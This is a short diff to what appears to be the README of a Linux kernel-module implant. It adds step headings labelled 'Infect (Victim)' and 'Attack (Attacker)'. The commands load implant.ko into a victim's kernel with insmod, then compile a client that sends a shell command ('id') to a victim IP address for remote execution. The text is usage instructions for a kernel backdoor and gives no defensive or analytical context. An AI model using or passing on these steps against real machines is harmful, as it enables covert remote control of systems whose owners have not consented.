@@ -69,7 +69,19 @@ I decided to move away from memory manipulation and focus on legitimate kernel n
 Compile the kernel module:
 ```bash
 make
+```
+
+### 2. Infect (Victim)
+Load the module into the kernel:
+```bash
 sudo insmod implant.ko
+```
+
+### Attack (Attacker)
+Compile the C client & attack:
+```bash
 gcc client.c -o client
 sudo ./client 192.168.1.6 "id"
 ```
+
+
